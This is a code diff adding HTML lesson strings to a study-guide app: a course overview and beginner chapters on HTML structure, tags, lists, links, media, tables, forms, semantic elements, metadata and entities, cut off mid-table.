@@ -53817,5 +53817,12939 @@ done
 <p>By writing short scripts, penetration testers can quickly execute many different permutations of a command to assist with brute-force attacks, network scanning, and similar tasks.</p>
 <p>This chapter scratched the surface of scripting to help you prepare for the PenTest+ exam. The exam requires that you have only a basic level of</p>
 </div>
+`,
+  "study-guide-overview": `
+<h1>Complete Study Guide Collection</h1>
+<h3>HTML &middot; CSS &middot; JavaScript &middot; Python &middot; SQL &middot; Java &middot; PowerShell &middot; CompTIA Tech+ &middot; CompTIA Network+ &middot; CompTIA Security+ &middot; CompTIA PenTest+ &middot; CompTIA Linux+</h3>
+
+<div class="lesson-callout">
+<p><strong>How to use this guide:</strong> Each lesson is a short, focused chapter from a larger complete study guide. Use the <strong>sidebar</strong> to move between chapters and topics, and track your progress lesson by lesson.</p>
+</div>
+
+<h2>What's covered</h2>
+<ol>
+<li>HTML</li>
+<li>CSS</li>
+<li>JavaScript (JS)</li>
+<li>Python</li>
+<li>SQL</li>
+<li>Java</li>
+<li>PowerShell</li>
+<li>CompTIA Tech+ (FC0-U71)</li>
+<li>CompTIA Network+ (N10-009)</li>
+<li>CompTIA Security+ (SY0-701)</li>
+<li>CompTIA PenTest+ (PT0-003)</li>
+<li>CompTIA Linux+ (XK0-005)</li>
+</ol>
+`,
+  "study-guide-html-01": `
+<h2>1. What Is HTML?</h2>
+<p>HTML (HyperText Markup Language) is the standard language used to create and structure content on the web. It is <strong>not</strong> a programming language — it is a <strong>markup language</strong> that describes the structure and meaning of web content using <strong>elements</strong> represented by <strong>tags</strong>.</p>
+<p>Every webpage you visit is built on HTML. Browsers (Chrome, Firefox, Safari) parse HTML files and render them visually. HTML works alongside <strong>CSS</strong> (for styling) and <strong>JavaScript</strong> (for behavior).</p>
+`,
+  "study-guide-html-02": `
+<h2>2. HTML Document Structure</h2>
+<p>Every HTML file follows a standard structure:</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+  &lt;head&gt;
+    &lt;meta charset="UTF-8" /&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
+    &lt;title&gt;My First Page&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;h1&gt;Hello, World!&lt;/h1&gt;
+    &lt;p&gt;This is my first webpage.&lt;/p&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Part</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;!DOCTYPE html&gt;</code></td>
+<td>Tells the browser this is an HTML5 document</td>
+</tr>
+<tr>
+<td><code>&lt;html lang="en"&gt;</code></td>
+<td>Root element; <code>lang</code> helps screen readers and SEO</td>
+</tr>
+<tr>
+<td><code>&lt;head&gt;</code></td>
+<td>Metadata — not visible on page</td>
+</tr>
+<tr>
+<td><code>&lt;meta charset="UTF-8"&gt;</code></td>
+<td>Character encoding (supports all languages)</td>
+</tr>
+<tr>
+<td><code>&lt;meta name="viewport"&gt;</code></td>
+<td>Makes page responsive on mobile</td>
+</tr>
+<tr>
+<td><code>&lt;title&gt;</code></td>
+<td>Text shown on browser tab</td>
+</tr>
+<tr>
+<td><code>&lt;body&gt;</code></td>
+<td>All visible content goes here</td>
+</tr>
+</tbody>
+</table>
+`,
+  "study-guide-html-03": `
+<h2>3. HTML Elements, Tags, and Attributes</h2>
+<h3>Anatomy of an Element</h3>
+<pre><code>&lt;tagname attribute="value"&gt; Content &lt;/tagname&gt;
+   ^         ^        ^         ^         ^
+Opening   Attr.   Attr.     Content   Closing
+  tag      name   value                 tag
+</code></pre><h3>Self-Closing (Void) Elements</h3>
+<p>Some elements have no content and no closing tag:</p>
+<pre><code>&lt;img src="photo.jpg" alt="A photo" /&gt;
+&lt;br /&gt;
+&lt;hr /&gt;
+&lt;input type="text" /&gt;
+&lt;meta charset="UTF-8" /&gt;
+&lt;link rel="stylesheet" href="style.css" /&gt;
+</code></pre>
+<h3>Global Attributes (work on any element)</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>id</code></td>
+<td>Unique identifier for one element</td>
+</tr>
+<tr>
+<td><code>class</code></td>
+<td>One or more class names (space-separated)</td>
+</tr>
+<tr>
+<td><code>style</code></td>
+<td>Inline CSS styles</td>
+</tr>
+<tr>
+<td><code>title</code></td>
+<td>Tooltip text on hover</td>
+</tr>
+<tr>
+<td><code>lang</code></td>
+<td>Language of the element's content</td>
+</tr>
+<tr>
+<td><code>tabindex</code></td>
+<td>Tab order for keyboard navigation</td>
+</tr>
+<tr>
+<td><code>hidden</code></td>
+<td>Hides the element</td>
+</tr>
+<tr>
+<td><code>data-*</code></td>
+<td>Custom data attributes (<code>data-user-id="42"</code>)</td>
+</tr>
+<tr>
+<td><code>aria-*</code></td>
+<td>Accessibility attributes</td>
+</tr>
+<tr>
+<td><code>contenteditable</code></td>
+<td>Makes element editable by user</td>
+</tr>
+</tbody>
+</table>
+`,
+  "study-guide-html-04": `
+<h2>4. Text Content Elements</h2>
+<h3>Headings</h3>
+<pre><code>&lt;h1&gt;Main Title (only one per page ideally)&lt;/h1&gt;
+&lt;h2&gt;Section Title&lt;/h2&gt;
+&lt;h3&gt;Subsection&lt;/h3&gt;
+&lt;h4&gt;Sub-subsection&lt;/h4&gt;
+&lt;h5&gt;Rarely used&lt;/h5&gt;
+&lt;h6&gt;Smallest heading&lt;/h6&gt;
+</code></pre>
+<p>Headings are <strong>semantic</strong> — they communicate importance to browsers, search engines, and screen readers, not just size.</p>
+<h3>Paragraphs and Line Breaks</h3>
+<pre><code>&lt;p&gt;This is a paragraph. Browsers collapse whitespace automatically.&lt;/p&gt;
+&lt;p&gt;Second paragraph — browsers add margin between paragraphs by default.&lt;/p&gt;
+&lt;br /&gt; &lt;!-- Line break — use sparingly --&gt;
+&lt;hr /&gt; &lt;!-- Thematic break / horizontal rule --&gt;
+</code></pre>
+<h3>Inline Text Formatting</h3>
+<pre><code>&lt;strong&gt;Bold/important text&lt;/strong&gt;       &lt;!-- Semantic importance --&gt;
+&lt;b&gt;Bold text&lt;/b&gt;                           &lt;!-- Visual only, no meaning --&gt;
+&lt;em&gt;Italic/emphasized text&lt;/em&gt;            &lt;!-- Semantic emphasis --&gt;
+&lt;i&gt;Italic text&lt;/i&gt;                         &lt;!-- Visual only --&gt;
+&lt;u&gt;Underlined&lt;/u&gt;
+&lt;s&gt;Strikethrough&lt;/s&gt;
+&lt;mark&gt;Highlighted text&lt;/mark&gt;
+&lt;small&gt;Fine print / smaller text&lt;/small&gt;
+&lt;sup&gt;Superscript&lt;/sup&gt;  &lt;!-- e.g., x&lt;sup&gt;2&lt;/sup&gt; = x² --&gt;
+&lt;sub&gt;Subscript&lt;/sub&gt;    &lt;!-- e.g., H&lt;sub&gt;2&lt;/sub&gt;O --&gt;
+&lt;code&gt;inline code&lt;/code&gt;
+&lt;pre&gt;&lt;code&gt;
+  preformatted block code
+  preserves whitespace
+&lt;/code&gt;&lt;/pre&gt;
+&lt;kbd&gt;Ctrl+C&lt;/kbd&gt;        &lt;!-- Keyboard input --&gt;
+&lt;var&gt;x&lt;/var&gt;             &lt;!-- Variable in math/code --&gt;
+&lt;abbr title="HyperText Markup Language"&gt;HTML&lt;/abbr&gt;
+&lt;cite&gt;Book Title&lt;/cite&gt;
+&lt;q&gt;Inline quotation&lt;/q&gt;
+&lt;blockquote cite="https://source.com"&gt;Long quotation&lt;/blockquote&gt;
+&lt;time datetime="2024-01-15"&gt;January 15, 2024&lt;/time&gt;
+&lt;address&gt;Contact info block&lt;/address&gt;
+</code></pre>
+`,
+  "study-guide-html-05": `
+<h2>5. Lists</h2>
+<h3>Unordered List (bullets)</h3>
+<pre><code>&lt;ul&gt;
+  &lt;li&gt;Apples&lt;/li&gt;
+  &lt;li&gt;Bananas&lt;/li&gt;
+  &lt;li&gt;Cherries&lt;/li&gt;
+&lt;/ul&gt;
+</code></pre>
+<h3>Ordered List (numbered)</h3>
+<pre><code>&lt;ol type="1" start="3"&gt;   &lt;!-- type: 1, A, a, I, i --&gt;
+  &lt;li&gt;First item (starts at 3)&lt;/li&gt;
+  &lt;li&gt;Second item&lt;/li&gt;
+&lt;/ol&gt;
+</code></pre>
+<h3>Description List (key-value pairs)</h3>
+<pre><code>&lt;dl&gt;
+  &lt;dt&gt;HTML&lt;/dt&gt;
+  &lt;dd&gt;HyperText Markup Language&lt;/dd&gt;
+  &lt;dt&gt;CSS&lt;/dt&gt;
+  &lt;dd&gt;Cascading Style Sheets&lt;/dd&gt;
+&lt;/dl&gt;
+</code></pre>
+<h3>Nested Lists</h3>
+<pre><code>&lt;ul&gt;
+  &lt;li&gt;Fruits
+    &lt;ul&gt;
+      &lt;li&gt;Citrus
+        &lt;ul&gt;
+          &lt;li&gt;Orange&lt;/li&gt;
+          &lt;li&gt;Lemon&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+</code></pre>
+`,
+  "study-guide-html-06": `
+<h2>6. Links and Navigation</h2>
+<h3>Basic Link</h3>
+<pre><code>&lt;a href="https://www.example.com"&gt;Visit Example&lt;/a&gt;
+</code></pre>
+<h3>Link Attributes</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Values</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>href</code></td>
+<td>URL, <code>#id</code>, <code>mailto:</code>, <code>tel:</code></td>
+<td>Destination</td>
+</tr>
+<tr>
+<td><code>target</code></td>
+<td><code>_blank</code>, <code>_self</code>, <code>_parent</code>, <code>_top</code></td>
+<td>Where to open</td>
+</tr>
+<tr>
+<td><code>rel</code></td>
+<td><code>noopener noreferrer</code>, <code>nofollow</code></td>
+<td>Relationship</td>
+</tr>
+<tr>
+<td><code>download</code></td>
+<td>filename</td>
+<td>Forces download</td>
+</tr>
+<tr>
+<td><code>title</code></td>
+<td>text</td>
+<td>Tooltip on hover</td>
+</tr>
+</tbody>
+</table>
+<pre><code>&lt;!-- External link in new tab (always use noopener for security) --&gt;
+&lt;a href="https://example.com" target="_blank" rel="noopener noreferrer"&gt;
+  External Site
+&lt;/a&gt;
+
+&lt;!-- Internal anchor (jumps to element with id="section2") --&gt;
+&lt;a href="#section2"&gt;Jump to Section 2&lt;/a&gt;
+&lt;h2 id="section2"&gt;Section 2&lt;/h2&gt;
+
+&lt;!-- Email link --&gt;
+&lt;a href="mailto:user@example.com?subject=Hello&amp;body=Hi there"&gt;Email Me&lt;/a&gt;
+
+&lt;!-- Phone link --&gt;
+&lt;a href="tel:+15551234567"&gt;Call Us&lt;/a&gt;
+
+&lt;!-- Download link --&gt;
+&lt;a href="file.pdf" download="my-document.pdf"&gt;Download PDF&lt;/a&gt;
+
+&lt;!-- Back to top --&gt;
+&lt;a href="#"&gt;Back to Top&lt;/a&gt;
+</code></pre>
+`,
+  "study-guide-html-07": `
+<h2>7. Images and Media</h2>
+<h3>Images</h3>
+<pre><code>&lt;img 
+  src="photo.jpg"          &lt;!-- Required: file path or URL --&gt;
+  alt="A mountain at sunset"  &lt;!-- Required: describes image for accessibility --&gt;
+  width="800"              &lt;!-- Optional: in pixels --&gt;
+  height="600"             &lt;!-- Optional: helps prevent layout shift --&gt;
+  loading="lazy"           &lt;!-- Defer loading until near viewport --&gt;
+  decoding="async"
+/&gt;
+</code></pre>
+<p><strong>Always provide <code>alt</code> text.</strong> Empty <code>alt=""</code> tells screen readers the image is decorative.</p>
+<h3>Responsive Images</h3>
+<pre><code>&lt;!-- srcset: offer multiple sizes; browser picks best --&gt;
+&lt;img 
+  src="image-800.jpg"
+  srcset="image-400.jpg 400w, image-800.jpg 800w, image-1600.jpg 1600w"
+  sizes="(max-width: 600px) 400px, (max-width: 1200px) 800px, 1600px"
+  alt="Responsive image example"
+/&gt;
+
+&lt;!-- picture: different image formats or art direction --&gt;
+&lt;picture&gt;
+  &lt;source srcset="image.avif" type="image/avif" /&gt;
+  &lt;source srcset="image.webp" type="image/webp" /&gt;
+  &lt;img src="image.jpg" alt="Fallback image" /&gt;
+&lt;/picture&gt;
+</code></pre>
+<h3>Figure and Figcaption</h3>
+<pre><code>&lt;figure&gt;
+  &lt;img src="chart.png" alt="Bar chart showing sales data" /&gt;
+  &lt;figcaption&gt;Figure 1: Annual sales by region (2023)&lt;/figcaption&gt;
+&lt;/figure&gt;
+</code></pre>
+<h3>Audio</h3>
+<pre><code>&lt;audio controls autoplay loop muted preload="auto"&gt;
+  &lt;source src="audio.mp3" type="audio/mpeg" /&gt;
+  &lt;source src="audio.ogg" type="audio/ogg" /&gt;
+  Your browser does not support the audio element.
+&lt;/audio&gt;
+</code></pre>
+<h3>Video</h3>
+<pre><code>&lt;video 
+  width="1280" 
+  height="720" 
+  controls 
+  autoplay 
+  loop 
+  muted 
+  poster="thumbnail.jpg"
+  preload="metadata"
+&gt;
+  &lt;source src="video.mp4" type="video/mp4" /&gt;
+  &lt;source src="video.webm" type="video/webm" /&gt;
+  &lt;track src="captions.vtt" kind="subtitles" srclang="en" label="English" /&gt;
+  Your browser does not support video.
+&lt;/video&gt;
+</code></pre>
+<h3>Embedding External Content</h3>
+<pre><code>&lt;!-- YouTube embed --&gt;
+&lt;iframe 
+  width="560" 
+  height="315" 
+  src="https://www.youtube.com/embed/VIDEO_ID" 
+  title="Video title"
+  frameborder="0" 
+  allow="accelerometer; autoplay; clipboard-write; encrypted-media"
+  allowfullscreen
+&gt;&lt;/iframe&gt;
+
+&lt;!-- Google Map embed --&gt;
+&lt;iframe
+  src="https://www.google.com/maps/embed?pb=..."
+  width="600"
+  height="450"
+  allowfullscreen=""
+  loading="lazy"
+&gt;&lt;/iframe&gt;
+</code></pre>
+`,
+  "study-guide-html-08": `
+<h2>8. Tables</h2>
+<p>Tables are for <strong>tabular data</strong> — not for layout!</p>
+<pre><code>&lt;table&gt;
+  &lt;caption&gt;Monthly Revenue&lt;/caption&gt;        &lt;!-- Accessible title --&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th scope="col"&gt;Month&lt;/th&gt;
+      &lt;th scope="col"&gt;Revenue&lt;/th&gt;
+      &lt;th scope="col"&gt;Growth&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;January&lt;/td&gt;
+      &lt;td&gt;$10,000&lt;/td&gt;
+      &lt;td&gt;+5%&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;February&lt;/td&gt;
+      &lt;td&gt;$12,000&lt;/td&gt;
+      &lt;td&gt;+20%&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+  &lt;tfoot&gt;
+    &lt;tr&gt;
+      &lt;td&gt;Total&lt;/td&gt;
+      &lt;td&gt;$22,000&lt;/td&gt;
+      &lt;td&gt;+12.5%&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tfoot&gt;
+&lt;/table&gt;
+</code></pre>
+<h3>Spanning Cells</h3>
+<pre><code>&lt;td colspan="2"&gt;Spans 2 columns&lt;/td&gt;
+&lt;td rowspan="3"&gt;Spans 3 rows&lt;/td&gt;
+</code></pre>
+`,
+  "study-guide-html-09": `
+<h2>9. Forms</h2>
+<p>Forms collect user input and send it to a server.</p>
+<h3>Complete Form Example</h3>
+<pre><code>&lt;form action="/submit" method="POST" enctype="multipart/form-data" novalidate&gt;
+
+  &lt;!-- Text fields --&gt;
+  &lt;label for="name"&gt;Full Name *&lt;/label&gt;
+  &lt;input type="text" id="name" name="name" 
+         required minlength="2" maxlength="50"
+         placeholder="John Doe" autocomplete="name" /&gt;
+
+  &lt;label for="email"&gt;Email Address&lt;/label&gt;
+  &lt;input type="email" id="email" name="email" 
+         placeholder="john@example.com" autocomplete="email" /&gt;
+
+  &lt;label for="password"&gt;Password&lt;/label&gt;
+  &lt;input type="password" id="password" name="password" 
+         minlength="8" autocomplete="new-password" /&gt;
+
+  &lt;label for="phone"&gt;Phone Number&lt;/label&gt;
+  &lt;input type="tel" id="phone" name="phone" pattern="[0-9]{10}" /&gt;
+
+  &lt;label for="website"&gt;Website&lt;/label&gt;
+  &lt;input type="url" id="website" name="website" /&gt;
+
+  &lt;label for="age"&gt;Age&lt;/label&gt;
+  &lt;input type="number" id="age" name="age" min="0" max="120" step="1" /&gt;
+
+  &lt;label for="birthday"&gt;Birthday&lt;/label&gt;
+  &lt;input type="date" id="birthday" name="birthday" /&gt;
+
+  &lt;!-- Range slider --&gt;
+  &lt;label for="volume"&gt;Volume: &lt;output id="vol-out"&gt;50&lt;/output&gt;&lt;/label&gt;
+  &lt;input type="range" id="volume" name="volume" min="0" max="100" value="50"
+         oninput="document.getElementById('vol-out').value = this.value" /&gt;
+
+  &lt;!-- Color picker --&gt;
+  &lt;label for="fav-color"&gt;Favorite Color&lt;/label&gt;
+  &lt;input type="color" id="fav-color" name="fav_color" value="#ff0000" /&gt;
+
+  &lt;!-- Textarea --&gt;
+  &lt;label for="message"&gt;Message&lt;/label&gt;
+  &lt;textarea id="message" name="message" rows="5" cols="40"
+            placeholder="Write your message here..." maxlength="500"&gt;&lt;/textarea&gt;
+
+  &lt;!-- Select (dropdown) --&gt;
+  &lt;label for="country"&gt;Country&lt;/label&gt;
+  &lt;select id="country" name="country" required&gt;
+    &lt;option value=""&gt;-- Select a country --&lt;/option&gt;
+    &lt;optgroup label="North America"&gt;
+      &lt;option value="us"&gt;United States&lt;/option&gt;
+      &lt;option value="ca"&gt;Canada&lt;/option&gt;
+    &lt;/optgroup&gt;
+    &lt;optgroup label="Europe"&gt;
+      &lt;option value="uk"&gt;United Kingdom&lt;/option&gt;
+      &lt;option value="de"&gt;Germany&lt;/option&gt;
+    &lt;/optgroup&gt;
+  &lt;/select&gt;
+
+  &lt;!-- Multi-select --&gt;
+  &lt;select id="skills" name="skills" multiple size="4"&gt;
+    &lt;option value="html"&gt;HTML&lt;/option&gt;
+    &lt;option value="css"&gt;CSS&lt;/option&gt;
+    &lt;option value="js"&gt;JavaScript&lt;/option&gt;
+    &lt;option value="python"&gt;Python&lt;/option&gt;
+  &lt;/select&gt;
+
+  &lt;!-- Radio buttons --&gt;
+  &lt;fieldset&gt;
+    &lt;legend&gt;Gender&lt;/legend&gt;
+    &lt;label&gt;&lt;input type="radio" name="gender" value="male" /&gt; Male&lt;/label&gt;
+    &lt;label&gt;&lt;input type="radio" name="gender" value="female" /&gt; Female&lt;/label&gt;
+    &lt;label&gt;&lt;input type="radio" name="gender" value="other" /&gt; Other&lt;/label&gt;
+  &lt;/fieldset&gt;
+
+  &lt;!-- Checkboxes --&gt;
+  &lt;fieldset&gt;
+    &lt;legend&gt;Interests&lt;/legend&gt;
+    &lt;label&gt;&lt;input type="checkbox" name="interests" value="tech" checked /&gt; Technology&lt;/label&gt;
+    &lt;label&gt;&lt;input type="checkbox" name="interests" value="music" /&gt; Music&lt;/label&gt;
+    &lt;label&gt;&lt;input type="checkbox" name="interests" value="sports" /&gt; Sports&lt;/label&gt;
+  &lt;/fieldset&gt;
+
+  &lt;!-- File upload --&gt;
+  &lt;label for="avatar"&gt;Profile Picture&lt;/label&gt;
+  &lt;input type="file" id="avatar" name="avatar" 
+         accept="image/*" multiple /&gt;
+
+  &lt;!-- Hidden field --&gt;
+  &lt;input type="hidden" name="csrf_token" value="abc123" /&gt;
+
+  &lt;!-- Datalist (autocomplete suggestions) --&gt;
+  &lt;label for="browser"&gt;Preferred Browser&lt;/label&gt;
+  &lt;input type="text" id="browser" name="browser" list="browsers" /&gt;
+  &lt;datalist id="browsers"&gt;
+    &lt;option value="Chrome"&gt;
+    &lt;option value="Firefox"&gt;
+    &lt;option value="Safari"&gt;
+    &lt;option value="Edge"&gt;
+  &lt;/datalist&gt;
+
+  &lt;!-- Submit options --&gt;
+  &lt;button type="submit"&gt;Submit Form&lt;/button&gt;
+  &lt;button type="reset"&gt;Reset&lt;/button&gt;
+  &lt;button type="button" onclick="doSomething()"&gt;Custom Action&lt;/button&gt;
+  &lt;input type="submit" value="Alternative Submit" /&gt;
+
+&lt;/form&gt;
+</code></pre>
+<h3>Form Attributes Summary</h3>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>action</code></td>
+<td>URL where form data is sent</td>
+</tr>
+<tr>
+<td><code>method</code></td>
+<td><code>GET</code> (data in URL) or <code>POST</code> (data in body)</td>
+</tr>
+<tr>
+<td><code>enctype</code></td>
+<td><code>multipart/form-data</code> for file uploads</td>
+</tr>
+<tr>
+<td><code>novalidate</code></td>
+<td>Skip browser validation</td>
+</tr>
+<tr>
+<td><code>autocomplete</code></td>
+<td>Enable/disable autofill</td>
+</tr>
+</tbody>
+</table>
+<h3>Input Types Reference</h3>
+<p><code>text</code>, <code>email</code>, <code>password</code>, <code>number</code>, <code>tel</code>, <code>url</code>, <code>date</code>, <code>time</code>, <code>datetime-local</code>, <code>month</code>, <code>week</code>, <code>color</code>, <code>range</code>, <code>file</code>, <code>checkbox</code>, <code>radio</code>, <code>submit</code>, <code>reset</code>, <code>button</code>, <code>hidden</code>, <code>search</code>, <code>image</code></p>
+`,
+  "study-guide-html-10": `
+<h2>10. Semantic HTML5 Elements</h2>
+<p>Semantic elements describe <strong>meaning</strong>, not just appearance. They help SEO, accessibility, and code readability.</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;...&lt;/head&gt;
+&lt;body&gt;
+
+  &lt;header&gt;
+    &lt;!-- Site header: logo, main navigation --&gt;
+    &lt;nav aria-label="Main navigation"&gt;
+      &lt;ul&gt;
+        &lt;li&gt;&lt;a href="/"&gt;Home&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href="/about"&gt;About&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href="/contact"&gt;Contact&lt;/a&gt;&lt;/li&gt;
+      &lt;/ul&gt;
+    &lt;/nav&gt;
+  &lt;/header&gt;
+
+  &lt;main&gt;
+    &lt;!-- Primary content of the page (only one per page) --&gt;
+
+    &lt;article&gt;
+      &lt;!-- Independent, self-contained content (blog post, news article) --&gt;
+      &lt;header&gt;
+        &lt;h1&gt;Article Title&lt;/h1&gt;
+        &lt;time datetime="2024-01-15"&gt;January 15, 2024&lt;/time&gt;
+        &lt;address&gt;By &lt;a href="/author"&gt;Jane Doe&lt;/a&gt;&lt;/address&gt;
+      &lt;/header&gt;
+
+      &lt;section&gt;
+        &lt;!-- Thematic grouping within content --&gt;
+        &lt;h2&gt;Introduction&lt;/h2&gt;
+        &lt;p&gt;Content here...&lt;/p&gt;
+      &lt;/section&gt;
+
+      &lt;section&gt;
+        &lt;h2&gt;Main Body&lt;/h2&gt;
+        &lt;p&gt;More content...&lt;/p&gt;
+
+        &lt;aside&gt;
+          &lt;!-- Tangentially related content (sidebar, callout) --&gt;
+          &lt;h3&gt;Related Info&lt;/h3&gt;
+          &lt;p&gt;Side note here...&lt;/p&gt;
+        &lt;/aside&gt;
+      &lt;/section&gt;
+
+      &lt;footer&gt;
+        &lt;!-- Article-level footer: tags, author bio, share buttons --&gt;
+        &lt;p&gt;Tags: &lt;a href="/tag/html"&gt;HTML&lt;/a&gt;&lt;/p&gt;
+      &lt;/footer&gt;
+    &lt;/article&gt;
+
+  &lt;/main&gt;
+
+  &lt;aside&gt;
+    &lt;!-- Site-level sidebar --&gt;
+    &lt;h2&gt;Recent Posts&lt;/h2&gt;
+    &lt;ul&gt;...&lt;/ul&gt;
+  &lt;/aside&gt;
+
+  &lt;footer&gt;
+    &lt;!-- Site-wide footer --&gt;
+    &lt;p&gt;&amp;copy; 2024 My Website. All rights reserved.&lt;/p&gt;
+    &lt;nav aria-label="Footer navigation"&gt;
+      &lt;a href="/privacy"&gt;Privacy Policy&lt;/a&gt;
+      &lt;a href="/terms"&gt;Terms of Service&lt;/a&gt;
+    &lt;/nav&gt;
+  &lt;/footer&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3>Semantic vs Non-Semantic</h3>
+<table>
+<thead>
+<tr>
+<th>Semantic</th>
+<th>Non-Semantic</th>
+<th>Use When</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;header&gt;</code></td>
+<td><code>&lt;div id="header"&gt;</code></td>
+<td>Site or section header</td>
+</tr>
+<tr>
+<td><code>&lt;nav&gt;</code></td>
+<td><code>&lt;div id="nav"&gt;</code></td>
+<td>Navigation links</td>
+</tr>
+<tr>
+<td><code>&lt;main&gt;</code></td>
+<td><code>&lt;div id="main"&gt;</code></td>
+<td>Primary page content</td>
+</tr>
+<tr>
+<td><code>&lt;article&gt;</code></td>
+<td><code>&lt;div class="post"&gt;</code></td>
+<td>Independent content</td>
+</tr>
+<tr>
+<td><code>&lt;section&gt;</code></td>
+<td><code>&lt;div class="section"&gt;</code></td>
+<td>Thematic grouping</td>
+</tr>
+<tr>
+<td><code>&lt;aside&gt;</code></td>
+<td><code>&lt;div class="sidebar"&gt;</code></td>
+<td>Supplementary content</td>
+</tr>
+<tr>
+<td><code>&lt;footer&gt;</code></td>
+<td><code>&lt;div id="footer"&gt;</code></td>
+<td>Footer content</td>
+</tr>
+<tr>
+<td><code>&lt;figure&gt;</code></td>
+<td><code>&lt;div class="figure"&gt;</code></td>
+<td>Images with captions</td>
+</tr>
+<tr>
+<td><code>&lt;time&gt;</code></td>
+<td><code>&lt;span&gt;</code></td>
+<td>Dates and times</td>
+</tr>
+<tr>
+<td><code>&lt;mark&gt;</code></td>
+<td><code>&lt;span class="highlight"&gt;</code></td>
+<td>Highlighted text</td>
+</tr>
+</tbody>
+</table>
+`,
+  "study-guide-html-11": `
+<h2>11. Div and Span (Non-Semantic Containers)</h2>
+<pre><code>&lt;!-- Block-level container: use when no semantic element fits --&gt;
+&lt;div class="card"&gt;
+  &lt;div class="card-header"&gt;Title&lt;/div&gt;
+  &lt;div class="card-body"&gt;Content&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;!-- Inline container: use for styling a portion of text --&gt;
+&lt;p&gt;My favorite color is &lt;span class="highlight"&gt;blue&lt;/span&gt; because it's calming.&lt;/p&gt;
+</code></pre>
+`,
+  "study-guide-html-12": `
+<h2>12. HTML Metadata and the <code>&lt;head&gt;</code></h2>
+<pre><code>&lt;head&gt;
+  &lt;!-- Character encoding --&gt;
+  &lt;meta charset="UTF-8" /&gt;
+
+  &lt;!-- Viewport for responsive design --&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
+
+  &lt;!-- SEO meta tags --&gt;
+  &lt;meta name="description" content="Page description (150-160 chars ideal)" /&gt;
+  &lt;meta name="keywords" content="html, web, tutorial" /&gt;
+  &lt;meta name="author" content="John Doe" /&gt;
+  &lt;meta name="robots" content="index, follow" /&gt;
+
+  &lt;!-- Open Graph (Facebook, LinkedIn sharing) --&gt;
+  &lt;meta property="og:title" content="Page Title" /&gt;
+  &lt;meta property="og:description" content="Page description" /&gt;
+  &lt;meta property="og:image" content="https://site.com/image.jpg" /&gt;
+  &lt;meta property="og:url" content="https://site.com/page" /&gt;
+  &lt;meta property="og:type" content="website" /&gt;
+
+  &lt;!-- Twitter Cards --&gt;
+  &lt;meta name="twitter:card" content="summary_large_image" /&gt;
+  &lt;meta name="twitter:title" content="Page Title" /&gt;
+  &lt;meta name="twitter:description" content="Description" /&gt;
+  &lt;meta name="twitter:image" content="https://site.com/image.jpg" /&gt;
+
+  &lt;!-- Canonical URL (avoid duplicate content) --&gt;
+  &lt;link rel="canonical" href="https://example.com/page/" /&gt;
+
+  &lt;!-- Favicon --&gt;
+  &lt;link rel="icon" type="image/png" href="/favicon.png" /&gt;
+  &lt;link rel="apple-touch-icon" href="/apple-touch-icon.png" /&gt;
+
+  &lt;!-- CSS Stylesheets --&gt;
+  &lt;link rel="stylesheet" href="style.css" /&gt;
+  &lt;link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto" /&gt;
+
+  &lt;!-- Preloading for performance --&gt;
+  &lt;link rel="preload" href="font.woff2" as="font" type="font/woff2" crossorigin /&gt;
+  &lt;link rel="preconnect" href="https://fonts.googleapis.com" /&gt;
+  &lt;link rel="dns-prefetch" href="//cdn.example.com" /&gt;
+
+  &lt;!-- Page title --&gt;
+  &lt;title&gt;Page Title | Site Name&lt;/title&gt;
+
+  &lt;!-- Inline CSS (avoid; prefer external file) --&gt;
+  &lt;style&gt;
+    body { font-family: sans-serif; }
+  &lt;/style&gt;
+
+  &lt;!-- JavaScript (defer = run after HTML parsed; async = run as soon as downloaded) --&gt;
+  &lt;script src="script.js" defer&gt;&lt;/script&gt;
+  &lt;script src="analytics.js" async&gt;&lt;/script&gt;
+&lt;/head&gt;
+</code></pre>
+
+`,
+  "study-guide-html-13": `
+<h2>13. HTML Entities and Special Characters</h2>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Entity Name</th>
+<th>Entity Number</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>&lt;</code></td>
+<td><code>&amp;lt;</code></td>
+<td><code>&amp;#60;</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code></td>
+<td><code>&amp;gt;</code></td>
+<td><code>&amp;#62;</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td><code>&amp;amp;</code></td>
+<td><code>&amp;#38;</code></td>
+</tr>
+<tr>
+<td><code>"</code></td>
+<td><code>&amp;quot;</code></td>
